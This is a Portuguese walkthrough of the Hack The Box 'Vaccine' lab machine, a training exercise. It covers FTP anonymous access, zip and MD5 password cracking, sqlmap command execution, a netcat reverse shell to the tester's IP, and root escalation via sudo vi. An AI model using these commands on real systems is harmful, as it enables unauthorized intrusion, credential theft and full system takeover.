# Maquina Vaccine do HTB

---

## Qual outro serviço está rodando além do SSH e HTTP?
Está rodando na porta 21 o FTP.

### Saída do Nmap:
```bash
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
```
Para poder acessar o servidor web é necessário colocar o IP da box no arquivo `/etc/hosts`, já coloquei caso seja necessário.

---

## Qual nome de usuário podemos acessar o FTP sem senha?
Por padrão, caso não seja desativado no sistema, é possível logar como usuário **anonymous**, usando o comando:
```bash
ftp <IP>
```
Após isso, ele pede o usuário onde você deve escrever `anonymous` e, para a senha, basta apertar *Enter*. Quando logado, conseguimos listar os arquivos com o comando `ls`, descobrindo um arquivo zip chamado `backup.zip`, que pode ser baixado com o comando `get`.

---

## Qual o nome do arquivo que baixamos no serviço?
**Backup.zip**

O arquivo está protegido por senha. Para isso, usaremos o **John The Ripper** com os seguintes comandos:
```bash
zip2john backup.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
```
Após quebrar o hash, descobrimos que a senha é **741852963**. Podemos descompactar o arquivo com:
```bash
unzip backup.zip
```
Ele extrai dois arquivos: um `.php` e outro `.css`.

---

## Qual script do John podemos usar para gerar um hash de senha do arquivo zip?
`zip2john`

---

## Qual a senha do admin para o website?
Dentro do arquivo `.php`, há um formulário com o login **admin** e a senha criptografada **`2cb42f8734ea607eefed3b70af13bbd3`**.

Essa senha está em **MD5**. Após descriptografá-la, obtemos:
```bash
qwerty789
```

---

## Que opção pode ser passada para o SQLMAP para tentar obter a execução de comando por meio da injeção de SQL?
`--os-shell`

Após logar no site como administrador usando a senha descoberta anteriormente, estamos na página autenticada. Pegamos a **URL** e o **cookie da sessão** e tentamos obter uma shell através do **sqlmap** com:
```bash
sqlmap -u "http://vaccine.htb/dashboard.php?search=test" --cookie="PHPSESSID=9m3tqfkvcdfadc88afl3c6jb5q" --os-shell
```

---

## Qual programa o usuário `postgres` pode rodar como root usando `sudo`?
Após acessar uma shell através do SQLMap, realizamos uma **conexão reversa** com `ncat` no nosso servidor utilizando o comando:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.216 4444 >/tmp/f
```
O comando foi gerado pelo site [RevShells](https://www.revshells.com/), onde inserimos nosso **IP (10.10.15.216)** e **porta (4444)**.

Para melhorar a interação com o shell, usamos:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL + Z  # Joga para background
stty raw -echo; fg
stty rows 38 columns 116
```

Posteriormente, usamos:
```bash
cd /var/www/html
```
No arquivo `dashboard.php`, encontramos a senha do usuário `postgres`:
```bash
user=postgres
password=P@s5w0rd!
```
Executamos:
```bash
sudo -l
```
E obtemos a seguinte saída:
```bash
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
Isso significa que podemos usar `vi` como root.

Tendo o login e senha do `postgres`, podemos fazer login via **SSH**:
```bash
ssh postgres@<IP>
```

---

## Submit user flag
Com o comando `cat`, podemos visualizar a flag do usuário no terminal.
```bash
cat /home/<usuario>/user.txt
```

---

## Submit root flag
Como `vi` pode ser executado como **root sem senha**, abrimos o arquivo de configuração:
```bash
sudo vi /etc/postgresql/11/main/pg_hba.conf
```
E utilizamos o método do **GTFOBins** para obter uma shell root:
```bash
:set shell=/bin/sh
:shell
```
Agora, conseguimos acessar `/root` e ler a flag com:
```bash
cat /root/root.txt
```

---

# 🎯 Com isso finalizamos a máquina! 🚀
